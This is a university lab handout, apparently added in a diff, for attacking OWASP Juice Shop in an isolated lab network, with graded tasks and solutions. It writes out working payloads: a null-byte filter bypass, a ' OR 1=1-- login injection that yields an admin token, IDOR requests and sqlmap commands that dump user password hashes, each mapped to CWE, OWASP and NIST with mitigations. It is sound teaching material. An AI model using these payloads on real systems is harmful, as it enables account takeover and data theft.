@@ -1,0 +1,564 @@
+====== Lab03. Web application security ======
+
+<note important>
+**CDCI Framework Context**
+
+Web application vulnerabilities are the most common attack surface on the Internet. This lab maps directly to multiple cyber defense frameworks:
+  * **OWASP Top 10 (2021)** — The industry standard for web application security risks. Today you will exploit: //A01 Broken Access Control//, //A03 Injection//, //A05 Security Misconfiguration//
+  * **NIST CSF 2.0** — //Protect (PR)//: PR.AA — Identity Management and Access Control, PR.DS — Data Security; //Detect (DE)//: DE.CM — Continuous Monitoring
+  * **CWE** — Each exploit in this lab maps to a specific weakness: [[https://cwe.mitre.org/data/definitions/89.html|CWE-89]] (SQL Injection), [[https://cwe.mitre.org/data/definitions/22.html|CWE-22]] (Path Traversal), [[https://cwe.mitre.org/data/definitions/639.html|CWE-639]] (Insecure Direct Object Reference), [[https://cwe.mitre.org/data/definitions/548.html|CWE-548]] (Exposure of Information Through Directory Listing), [[https://cwe.mitre.org/data/definitions/200.html|CWE-200]] (Exposure of Sensitive Information)
+  * **MITRE ATT&CK** — T1190 (Exploit Public-Facing Application), T1083 (File and Directory Discovery), T1078 (Valid Accounts via credential theft)
+
+Throughout this lab, pay attention to **why** each vulnerability exists and **which framework control** would have prevented it.
+</note>
+
+<note warning>
+Important read to be graded!
+{{page>:cdci:rec&nofooter&noeditbutton&noheader}}
+</note>
+
+===== Objectives =====
+
+  * Scan a web application for security misconfigurations using automated tools
+  * Exploit directory listing and path traversal to access sensitive files
+  * Perform SQL injection against a REST API to bypass authentication
+  * Exploit Insecure Direct Object References (IDOR) to access unauthorized data
+  * Automate SQL injection exploitation using sqlmap
+  * Classify each finding against OWASP Top 10, CWE, and NIST CSF
+
+===== Topology =====
+
+<code>
+┌──────────────┐                    ┌──────────────────┐
+│   attacker   │                    │    juiceshop      │
+│  10.0.0.2/24 │───── sw0 ─────────│   10.0.0.3/24    │
+│  (cdci_base) │                    │   (juiceshop)    │
+│              │                    │   :3000           │
+│  curl, jq,   │                    │                  │
+│  nmap, nikto,│                    │  OWASP Juice Shop│
+│  sqlmap      │                    │                  │
+└──────────────┘                    └──────────────────┘
+</code>
+
+===== Target =====
+
+**OWASP Juice Shop** is an intentionally insecure web application for security training. Unlike traditional vulnerable apps that present a menu of attacks, Juice Shop is a realistic e-commerce application where vulnerabilities must be //discovered// — just like in a real penetration test. All challenges are mapped to the OWASP Top 10 and CWEs by the project itself.
+
+<note>
+In this lab, all attacks are performed using ''curl'' and command-line tools. No browser is needed.
+</note>
+
+===== Tasks =====
+
+==== 01. [10p] Setup and connectivity ====
+
+First, make sure that your virtual machine is updated (run the provided update.sh script).
+<code>
+root@cdci:/# cat update.sh
+#!/bin/bash
+# (c) Mihai Chiroiu - CDCI
+
+cd /home/student/CDCI-labs && git pull
+</code>
+
+Next, in one terminal start the provided Mininet topology.
+<code>
+root@cdci:/# cd /home/student/CDCI-labs/labs/lab03
+root@cdci:/# /usr/bin/python3 topology.py
+</code>
+
+If there are any problems with starting the topology (if all is good you should see the Mininet prompt ">") use the given cleanup script and try to restart the topology.
+
+Open a second terminal and login to the attacker container:
+<code>
+root@cdci:/home/student/CDCI-labs/labs/lab03# ./attacker.sh
+root@attacker:/#
+</code>
+
+Verify that Juice Shop is running:
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000 | head -5
+</code>
+
+You should see HTML content. The Juice Shop REST API is at ''http://10.0.0.3:3000/rest/'' and ''http://10.0.0.3:3000/api/''.
+
+<note tip>
+Throughout this lab, pipe JSON responses through ''jq'' for readability: ''curl -s ... | jq .''
+</note>
+
+<solution>
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000 | head -5
+<!DOCTYPE html><html lang="en">...
+
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/admin/application-version | jq .
+{
+  "version": "..."
+}
+</code>
+</solution>
+
+==== 02. [15p] Reconnaissance: scanning for misconfigurations ====
+
+<note>
+**OWASP A05** — [[https://owasp.org/Top10/A05_2021-Security_Misconfiguration/|Security Misconfiguration]]. Unnecessary features enabled, default configurations, verbose error messages, and exposed sensitive endpoints are all signs of misconfiguration. This maps to **[[https://cwe.mitre.org/data/definitions/200.html|CWE-200]]** (Exposure of Sensitive Information to an Unauthorized Actor) and **[[https://cwe.mitre.org/data/definitions/548.html|CWE-548]]** (Exposure of Information Through Directory Listing).
+</note>
+
+In a real engagement, the first step is always reconnaissance. Use ''nmap'' and ''nikto'' to scan the Juice Shop application and discover hidden endpoints.
+
+**Step 1 — Service scan with nmap:**
+<code>
+root@attacker:/# nmap -sV -T4 10.0.0.3 -p 3000
+</code>
+
+**Step 2 — Vulnerability scan with nikto:**
+<code>
+root@attacker:/# nikto -h http://10.0.0.3:3000
+</code>
+
+Review the nikto output carefully. It will report several interesting findings. Write down:
+  * What web server and framework is Juice Shop running?
+  * Did nikto find any exposed directories or files?
+  * Did nikto report any missing security headers?
+
+**Step 3 — Manual endpoint discovery:**
+
+Based on the nikto output and common patterns, probe the following endpoints with ''curl'':
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/ftp/ | head -20
+root@attacker:/# curl -s http://10.0.0.3:3000/metrics
+root@attacker:/# curl -s http://10.0.0.3:3000/api/SecurityQuestions | jq .
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/admin/application-version | jq .
+</code>
+
+<note important>
+**Questions to answer:**
+  - The ''/ftp'' endpoint exposes a directory listing. Which **CWE** is this? (Hint: [[https://cwe.mitre.org/data/definitions/548.html|CWE-548]])
+  - The ''/metrics'' endpoint exposes Prometheus operational metrics. Why is this a security risk? Which **NIST CSF** subcategory should ensure this is not publicly exposed? (Hint: PR.AC — Access Control)
+  - The ''/api/SecurityQuestions'' endpoint returns all security questions. How could an attacker use this information? Which **MITRE ATT&CK** technique does this enable? (Hint: T1589 — Gather Victim Identity Information)
+</note>
+
+<solution>
+<code>
+root@attacker:/# nmap -sV -T4 10.0.0.3 -p 3000
+PORT     STATE SERVICE VERSION
+3000/tcp open  http    Node.js Express framework
+
+root@attacker:/# nikto -h http://10.0.0.3:3000
+# Output includes:
+# - X-Content-Type-Options header not set
+# - X-Frame-Options header not set
+# - /ftp/ directory found
+# - Various other findings
+
+root@attacker:/# curl -s http://10.0.0.3:3000/ftp/
+# Returns HTML listing of files: acquisitions.md, coupons_2013.md.bak,
+# eastere.gg, encrypt.pyc, incident-support.kdbx, package.json.bak, etc.
+
+root@attacker:/# curl -s http://10.0.0.3:3000/metrics | head -10
+# Returns Prometheus metrics: process_cpu_*, http_request_duration_*, etc.
+
+root@attacker:/# curl -s http://10.0.0.3:3000/api/SecurityQuestions | jq .
+# Returns all security questions with their IDs
+
+# Answers:
+# 1. CWE-548 — Directory listing exposes internal files
+# 2. /metrics leaks operational data (memory, CPU, request rates, error rates).
+#    NIST CSF PR.AC-4 — Access permissions should follow least privilege.
+# 3. Security questions can be used for account takeover (T1589.001 — Credentials)
+</code>
+</solution>
+
+==== 03. [15p] Sensitive data exposure: path traversal ====
+
+<note>
+**OWASP A01** — [[https://owasp.org/Top10/A01_2021-Broken_Access_Control/|Broken Access Control]]. The ''/ftp'' endpoint serves files, but only those with specific extensions (.md, .pdf). However, the input validation can be bypassed. This exploits **[[https://cwe.mitre.org/data/definitions/22.html|CWE-22]]** (Improper Limitation of a Pathname to a Restricted Directory, aka //Path Traversal//) and relates to the well-known **[[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7921|CVE-2017-7921]]** pattern (unauthenticated path traversal leading to sensitive file access).
+</note>
+
+You discovered the ''/ftp'' directory in the previous exercise. Now exploit it.
+
+**Step 1 — Download an allowed file:**
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/ftp/acquisitions.md
+</code>
+
+This works because ''.md'' files are in the allowlist.
+
+**Step 2 — Try to download a restricted file:**
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/ftp/package.json.bak
+</code>
+
+This should fail — the server rejects files with the ''.bak'' extension.
+
+**Step 3 — Bypass the extension filter using the Poison Null Byte:**
+
+The server validates file extensions using a pattern that checks the end of the filename. By injecting a URL-encoded null byte (''%2500''), you can terminate the string early, tricking the validation logic into accepting the file:
+<code>
+root@attacker:/# curl -s "http://10.0.0.3:3000/ftp/package.json.bak%2500.md"
+</code>
+
+The server sees ''.md'' at the end (passes validation), but the filesystem reads ''package.json.bak'' (stops at the null byte).
+
+**Step 4 — Download the Easter egg and the KDBX file:**
+<code>
+root@attacker:/# curl -s "http://10.0.0.3:3000/ftp/eastere.gg%2500.md"
+root@attacker:/# curl -s -o incident-support.kdbx "http://10.0.0.3:3000/ftp/incident-support.kdbx%2500.md"
+</code>
+
+<note important>
+**Questions to answer:**
+  - The null byte trick exploits a mismatch between the web framework's string handling and the filesystem's string handling. Which **CWE** specifically covers null byte injection? (Hint: [[https://cwe.mitre.org/data/definitions/158.html|CWE-158]])
+  - The ''package.json.bak'' file may contain dependency versions with known vulnerabilities. Which **OWASP Top 10** category covers using components with known vulnerabilities? (Hint: //A06//)
+  - You downloaded a ''.kdbx'' (KeePass database) file. If this contained real credentials, which **NIST CSF** function failed? (Hint: //Protect// — PR.DS — Data Security)
+  - Propose one server-side mitigation to prevent the null byte bypass. (Hint: strip or reject null bytes in input)
+</note>
+
+<solution>
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/ftp/acquisitions.md
+# Returns the contents of the markdown file (merger/acquisition info)
+
+root@attacker:/# curl -s http://10.0.0.3:3000/ftp/package.json.bak
+# Returns 403 Forbidden — "Only .md and .pdf files are allowed."
+
+root@attacker:/# curl -s "http://10.0.0.3:3000/ftp/package.json.bak%2500.md"
+# Returns the contents of package.json.bak — the null byte bypasses the check!
+# This file contains all npm dependencies and their versions.
+
+root@attacker:/# curl -s "http://10.0.0.3:3000/ftp/eastere.gg%2500.md"
+# Returns the Easter egg file contents
+
+# Answers:
+# 1. CWE-158 (Improper Neutralization of Null Byte or NUL Character)
+# 2. OWASP A06 — Vulnerable and Outdated Components
+# 3. NIST CSF Protect (PR) — PR.DS-1 (Data-at-rest is protected) — sensitive files
+#    should not be accessible via public-facing endpoints
+# 4. Mitigation: sanitize input by stripping %00/%2500 null bytes before processing;
+#    use a strict allowlist approach matching filename without extension manipulation
+</code>
+</solution>
+
+==== 04. [20p] SQL injection: REST API login bypass ====
+
+<note>
+**OWASP A03** — [[https://owasp.org/Top10/A03_2021-Injection/|Injection]]. SQL injection remains one of the most critical web vulnerabilities. It occurs when user input is concatenated into SQL queries without proper sanitization. This is **[[https://cwe.mitre.org/data/definitions/89.html|CWE-89]]** (Improper Neutralization of Special Elements used in an SQL Command). Famous real-world examples include the 2017 Equifax breach ([[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638|CVE-2017-5638]]) and the 2008 Heartland Payment Systems breach.
+</note>
+
+The Juice Shop login endpoint is a REST API at ''/rest/user/login'' that accepts JSON. You will exploit SQL injection to bypass authentication entirely.
+
+**Step 1 — Observe a normal login attempt:**
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"test@test.com","password":"test"}' | jq .
+</code>
+
+You should see an error: "Invalid email or password." Note the response structure.
+
+**Step 2 — Inject SQL into the email field:**
+
+The email field is concatenated into a SQL query like: ''SELECT * FROM Users WHERE email='<input>' AND ...''
+
+By injecting ''' OR 1=1--'' as the email, the query becomes:
+''SELECT * FROM Users WHERE email='' OR 1=1--' AND ...''
+
+The ''OR 1=1'' makes the condition always true, and ''--'' comments out the rest of the query. First, save the payload to a file (to avoid shell escaping issues), then send it:
+<code>
+root@attacker:/# echo '{"email":"'"'"' OR 1=1--","password":"x"}' > payload.json
+root@attacker:/# cat payload.json
+{"email":"' OR 1=1--","password":"x"}
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d @payload.json | jq .
+</code>
+
+**Step 3 — Extract the authentication token:**
+
+On success, the response contains an ''authentication'' object with a ''token'' (JWT). Extract it:
+<code>
+root@attacker:/# TOKEN=$(curl -s http://10.0.0.3:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d @payload.json | jq -r '.authentication.token')
+root@attacker:/# echo $TOKEN
+</code>
+
+**Step 4 — Use the admin token to access restricted endpoints:**
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/admin/application-configuration \
+  -H "Authorization: Bearer $TOKEN" | jq '.config.application.name'
+</code>
+
+**Step 5 — Decode the JWT to understand what you got:**
+<code>
+root@attacker:/# echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+</code>
+
+<note important>
+**Questions to answer:**
+  - The injected payload ''**' OR 1=1--**'' always returns the **first** user in the database. Why is this the admin? (Hint: think about user creation order)
+  - What is a //parameterized query// (prepared statement)? Write a pseudocode example showing the vulnerable query vs. the fixed version.
+  - The JWT token is signed but **not encrypted**. Decode it (Step 5) — what user information is exposed? Which **CWE** covers exposing sensitive data in tokens? (Hint: [[https://cwe.mitre.org/data/definitions/315.html|CWE-315]])
+  - From a defender's perspective, which **NIST CSF** subcategory should ensure that input validation is implemented? (Hint: PR.DS — Data Security, specifically input sanitization)
+</note>
+
+<solution>
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"test@test.com","password":"test"}' | jq .
+{
+  "error": "Invalid email or password."
+}
+
+root@attacker:/# echo '{"email":"'"'"' OR 1=1--","password":"x"}' > payload.json
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d @payload.json | jq .
+{
+  "authentication": {
+    "token": "eyJhbGciOi...",
+    "bid": 1,
+    "umail": "admin@juice-sh.op"
+  }
+}
+
+root@attacker:/# TOKEN=$(curl -s http://10.0.0.3:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d @payload.json | jq -r '.authentication.token')
+
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/admin/application-configuration \
+  -H "Authorization: Bearer $TOKEN" | jq '.config.application.name'
+"OWASP Juice Shop"
+
+root@attacker:/# echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+{
+  "status": "success",
+  "data": {
+    "id": 1,
+    "email": "admin@juice-sh.op",
+    "role": "admin"
+  }
+}
+
+# Answers:
+# 1. OR 1=1 returns ALL rows; SQL typically returns them in insertion order.
+#    The admin is user #1 (first registered). To target a specific user:
+#    ' OR email LIKE '%admin%'--
+# 2. Vulnerable:  query = "SELECT * FROM Users WHERE email='" + input + "'"
+#    Fixed:       query = "SELECT * FROM Users WHERE email = ?"
+#                 db.execute(query, [input])  // input is never part of SQL syntax
+# 3. JWT payload contains email, role, id — CWE-315 (Cleartext Storage of
+#    Sensitive Information in a Cookie). Tokens should not contain sensitive data
+#    or should be encrypted (JWE).
+# 4. NIST CSF PR.DS — ensure all inputs are validated and sanitized before processing
+</code>
+</solution>
+
+==== 05. [15p] Broken access control: IDOR and user enumeration ====
+
+<note>
+**OWASP A01** — [[https://owasp.org/Top10/A01_2021-Broken_Access_Control/|Broken Access Control]]. Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to directly access objects (database rows, files) without verifying that the user is authorized to access that specific object. This is **[[https://cwe.mitre.org/data/definitions/639.html|CWE-639]]** (Authorization Bypass Through User-Controlled Key).
+</note>
+
+You have an admin JWT token from the previous exercise. Now explore what an authenticated attacker can access.
+
+**Step 1 — Access other users' shopping baskets (IDOR):**
+
+Your admin account has ''bid'' (basket ID) 1. Try accessing other users' baskets:
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/basket/1 \
+  -H "Authorization: Bearer $TOKEN" | jq .
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/basket/2 \
+  -H "Authorization: Bearer $TOKEN" | jq .
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/basket/3 \
+  -H "Authorization: Bearer $TOKEN" | jq .
+</code>
+
+**Step 2 — Enumerate all users via the API:**
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/api/Users \
+  -H "Authorization: Bearer $TOKEN" | jq '.data[] | {id, email, role}'
+</code>
+
+**Step 3 — Access the admin panel:**
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/administration \
+  -H "Authorization: Bearer $TOKEN" | head -5
+</code>
+
+<note important>
+**Questions to answer:**
+  - In Step 1, you accessed basket ID 2 and 3 — these belong to other users. Why does the server allow this? What check is missing? (Hint: the server verifies you are //authenticated// but not that you are //authorized// for that specific basket)
+  - **[[https://cwe.mitre.org/data/definitions/639.html|CWE-639]]** vs. **[[https://cwe.mitre.org/data/definitions/284.html|CWE-284]]**: what is the difference between IDOR (user-controlled key) and general improper access control? Give an example of each.
+  - The ''/api/Users'' endpoint returns all users. Write a one-line curl command that extracts only the email addresses. How could a defender restrict this endpoint?
+  - From a **NIST CSF** perspective, which function and subcategory should ensure that users can only access their own data? (Hint: //Protect// — PR.AA)
+</note>
+
+<solution>
+<code>
+root@attacker:/# curl -s http://10.0.0.3:3000/rest/basket/2 \
+  -H "Authorization: Bearer $TOKEN" | jq .
+# Returns another user's basket contents — IDOR!
+
+root@attacker:/# curl -s http://10.0.0.3:3000/api/Users \
+  -H "Authorization: Bearer $TOKEN" | jq '.data[] | {id, email, role}'
+{
+  "id": 1,
+  "email": "admin@juice-sh.op",
+  "role": "admin"
+}
+{
+  "id": 2,
+  "email": "jim@juice-sh.op",
+  "role": "customer"
+}
+# ... more users
+
+# Extract only emails:
+root@attacker:/# curl -s http://10.0.0.3:3000/api/Users \
+  -H "Authorization: Bearer $TOKEN" | jq -r '.data[].email'
+
+# Answers:
+# 1. The server checks the JWT is valid (authentication) but does NOT check
+#    if the basket belongs to the requesting user (authorization). The fix:
+#    verify basket.userId == token.userId before returning data.
+# 2. CWE-639 (IDOR): user changes basket_id=2 to access another user's data.
+#    CWE-284 (Improper Access Control): user accesses /admin without having
+#    the admin role at all.
+# 3. Defender: restrict /api/Users to admin role only, or return only the
+#    current user's data (filter by token.userId).
+# 4. NIST CSF Protect (PR) — PR.AA — Identity Management, Authentication,
+#    and Access Control: enforce least privilege per user.
+</code>
+</solution>
+
+==== 06. [20p] Automated SQL injection with sqlmap ====
+
+<note>
+**OWASP A03** — [[https://owasp.org/Top10/A03_2021-Injection/|Injection]]. In exercise 04, you performed SQL injection manually. Now you will use **sqlmap**, an automated SQL injection tool, to demonstrate how attackers can extract entire databases in minutes. This reinforces why **[[https://cwe.mitre.org/data/definitions/89.html|CWE-89]]** is considered critical — a single injection point can compromise the entire database.
+</note>
+
+**Step 1 — Identify an injectable endpoint:**
+
+The product search endpoint passes user input to a SQL query. The underlying query looks like: ''SELECT * FROM Products WHERE ((name LIKE '%<input>%' OR description LIKE '%<input>%'))''. Notice the double parentheses — your injection must close them.
+
+Test normal behavior first, then inject:
+<code>
+root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q=apple" | jq '.data | length'
+root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q='" | jq '.data | length'
+root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q=test'))%20OR%201=1--" | jq '.data | length'
+</code>
+
+Compare the results:
+  * ''apple'' returns a few matching products (e.g., 3)
+  * A single quote returns **0** — the query breaks silently (the error is caught by the application)
+  * ''test')) OR 1=1--'' returns **all products** (e.g., 56) — the ''OR 1=1'' makes the WHERE clause always true
+
+<note tip>
+Not all SQL injection produces a visible error. In this case, the application catches the error and returns an empty result. This is called **boolean-based blind SQL injection** — you detect it by comparing the number of results between a normal query and an injected one.
+</note>
+
+**Step 2 — Run sqlmap to enumerate databases:**
+<code>
+root@attacker:/# sqlmap -u "http://10.0.0.3:3000/rest/products/search?q=test" \
+  --batch --dbs --level=3 --risk=2 --tamper=between
+</code>
+
+The ''--batch'' flag runs in non-interactive mode (auto-answers all prompts). The ''--level=3'' increases detection depth, and ''--risk=2'' enables more aggressive tests. Write down the databases found.
+
+**Step 3 — Dump the Users table:**
+<code>
+root@attacker:/# sqlmap -u "http://10.0.0.3:3000/rest/products/search?q=test" \
+  --batch -D main -T Users --dump --level=3 --risk=2 --tamper=between
+</code>
+
+<note warning>
+sqlmap may take several minutes to run. This is expected. Use ''--threads=4'' to speed it up.
+</note>
+
+**Step 4 — Compare manual vs automated results:**
+
+Look at the dumped Users table. You should see usernames, emails, password hashes, and roles — the same information you accessed via the API in exercise 05, but obtained through a completely different attack vector.
+
+<note important>
+**Questions to answer:**
+  - You manually exploited the login endpoint (exercise 04) and sqlmap automated the search endpoint (this exercise). Both exploit **[[https://cwe.mitre.org/data/definitions/89.html|CWE-89]]**. How many injectable endpoints might exist in a large application? Why is automated scanning essential?
+  - sqlmap found the password hashes. If these were stored as unsalted MD5 (like **[[https://cwe.mitre.org/data/definitions/328.html|CWE-328]]** — Use of Weak Hash), how quickly could they be cracked? (Hint: recall lab02 exercise 11)
+  - From a **NIST CSF** perspective: the //Detect// function (DE.CM — Continuous Monitoring) should catch automated SQL injection attempts. What would a WAF (Web Application Firewall) or IDS alert look like for sqlmap traffic? (Hint: think about request patterns, User-Agent headers)
+  - Propose a defense-in-depth strategy against SQL injection. Name at least 3 layers: (a) code-level, (b) infrastructure-level, (c) monitoring-level.
+</note>
+
+<solution>
+<code>
+root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q=apple" | jq '.data | length'
+3
+root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q='" | jq '.data | length'
+0
+# The single quote breaks the query — but the error is silenced (returns empty).
+# This is boolean-based blind SQLi: 0 results = broken query.
+
+root@attacker:/# curl -s "http://10.0.0.3:3000/rest/products/search?q=test'))%20OR%201=1--" | jq '.data | length'
+56
+# OR 1=1 returns ALL products — confirms injection works.
+# The ')) closes the double parentheses in: WHERE ((name LIKE '%test%'...))
+
+root@attacker:/# sqlmap -u "http://10.0.0.3:3000/rest/products/search?q=test" \
+  --batch --dbs --level=3 --risk=2 --tamper=between
+# Output:
+# available databases [1]:
+# [*] main
+
+root@attacker:/# sqlmap -u "http://10.0.0.3:3000/rest/products/search?q=test" \
+  --batch -D main -T Users --dump --level=3 --risk=2 --tamper=between
+# Dumps the entire Users table with columns:
+# id, username, email, password (hashed), role, ...
+# Includes admin@juice-sh.op, jim@juice-sh.op, etc.
+
+# Answers:
+# 1. Large applications can have hundreds of endpoints, each potentially injectable.
+#    Manual testing is infeasible at scale — automated tools like sqlmap, Burp Suite,
+#    or OWASP ZAP are essential for security assessments.
+# 2. Unsalted MD5: a modern GPU cracks ~50 billion MD5/sec. An 8-char password
+#    (26^8 ≈ 2×10^11) would take ~4 seconds. With bcrypt (cost 12): ~1,585 years.
+# 3. sqlmap signatures: rapid sequential requests to same endpoint, varying quote chars,
+#    UNION SELECT payloads, User-Agent "sqlmap/x.x". WAF rules detect these patterns.
+# 4. Defense-in-depth:
+#    (a) Code: parameterized queries / prepared statements (eliminates CWE-89)
+#    (b) Infrastructure: WAF (ModSecurity, AWS WAF) + least-privilege DB accounts
+#    (c) Monitoring: IDS/IPS rules for SQLi patterns, anomaly detection on query rates,
+#        SIEM alerts on error spikes (500 responses)
+</code>
+</solution>
+
+==== 07. [5p] Framework mapping — classify your findings ====
+
+<note>
+This is the most important exercise from a CDCI perspective. Cyber defense is not just about //finding// vulnerabilities — it is about //classifying// them using industry-standard frameworks so that organizations can prioritize remediation, communicate risk to management, and comply with regulations (NIS2, GDPR, PCI DSS).
+</note>
+
+For each exploit you performed in exercises 02-06, fill in the following table. Use the references provided throughout the lab.
+
+^ Exercise ^ Attack performed ^ OWASP Top 10 ^ CWE-ID ^ NIST CSF Function & Subcategory ^ Proposed Mitigation ^
+| 02 | Directory listing + exposed metrics | ? | ? | ? | ? |
+| 03 | Path traversal via null byte  | ? | ? | ? | ? |
+| 04 | SQL injection login bypass | ? | ? | ? | ? |
+| 05 | IDOR + user enumeration | ? | ? | ? | ? |
+| 06 | Automated SQLi (sqlmap) | ? | ? | ? | ? |
+
+<note important>
+**Guidelines for filling the table:**
+  * **OWASP Top 10**: Use the 2021 edition codes (A01-A10). Full list: [[https://owasp.org/Top10/|owasp.org/Top10]]
+  * **CWE-ID**: Link to the specific CWE entry. Use [[https://cwe.mitre.org|cwe.mitre.org]] to look up IDs.
+  * **NIST CSF**: State which function (Identify/Protect/Detect/Respond/Recover) and subcategory (e.g., PR.DS-1) **should have prevented** the attack.
+  * **Mitigation**: One concrete, actionable fix (e.g., "use parameterized queries", not "fix the code").
+</note>
+
+<solution>
+^ Exercise ^ Attack performed ^ OWASP Top 10 ^ CWE-ID ^ NIST CSF Function & Subcategory ^ Proposed Mitigation ^
+| 02 | Directory listing, exposed /metrics | A05 Security Misconfiguration | CWE-548, CWE-200 | PR.AC-4 (Access Control) | Disable directory listing; restrict /metrics to internal network/auth |
+| 03 | Null byte path traversal | A01 Broken Access Control | CWE-22, CWE-158 | PR.DS-1 (Data-at-rest protection) | Sanitize null bytes in input; use allowlist for accessible files |
+| 04 | SQL injection login bypass | A03 Injection | CWE-89 | PR.DS (Input validation) | Use parameterized queries / prepared statements |
+| 05 | IDOR on baskets + user enum | A01 Broken Access Control | CWE-639, CWE-284 | PR.AA (Access Control) | Verify object ownership server-side before returning data |
+| 06 | Automated SQLi (sqlmap) | A03 Injection | CWE-89 | DE.CM (Continuous Monitoring) | WAF + parameterized queries + rate limiting + IDS alerts |
+</solution>
